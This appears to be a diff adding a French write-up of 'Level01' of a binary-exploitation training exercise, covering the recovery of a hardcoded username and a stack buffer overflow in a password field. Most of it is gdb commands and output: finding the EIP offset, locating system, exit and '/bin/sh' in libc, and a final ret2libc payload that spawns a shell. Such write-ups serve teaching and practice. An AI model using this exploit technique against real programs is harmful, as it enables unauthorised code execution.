@@ -1,0 +1,64 @@
+### Level01
+
+Ce programme permet de renseigner un username et un password a l'aide de la fonction fgets().
+Dans le code decompile, la fonction verify_user_name() fait un strcmp() entre notre input et la string "dat_wil".
+Si la comparaison est correct on passe a la fonction verify_user_pass() sinon le programme quitte.
+La fonction verify_user_pass() compare l'input mot de passe avec la string "admin".
+Peu importe le retour de cette fonction, le programme nous dira que le password est incorrect.
+
+Le but ici est de faire un buffer overflow dans le buffer password[16] grave au fgets() qui lit 100 octets sur l'entre standard.
+
+On rentre la string "dat_wil\n" pour passer l'etape du username, avec un pattern de 100 pour tenter un buffer overflow :
+
+	(gdb) r < <(python -c 'print "dat_wil\n" + "A0B0C0D0E0F0G0H0I0J0K0L0M0N0O0P0Q0R0S0T0U0V0W0X0Y0Z0A1B1C1D1E1F1G1H1I1J1K1L1M1N1O1P1Q1R1S1T1U1V1W1X1"')
+
+On obtient :
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x3150314f in ?? ()
+
+Le registre EIP est ecrase a l'offset :
+
+	80
+
+On decide alors de recuperer l'adresse de system, exit et /bin/sh pour executer un shell via notre injection de shellcode
+Adresse de system :
+
+	(gdb) p system
+	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+Adresse d'exit :
+	(gdb) p exit
+	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+Adresse de "/bin/sh" dans la libc :
+
+	(gdb) i proc map
+	process 4720
+	Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fd8000 0xf7fdb000     0x3000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+	(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+	0xf7f897ec
+	1 pattern found.
+
+
+Shellcode final :
+
+	(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat -) | ./level01
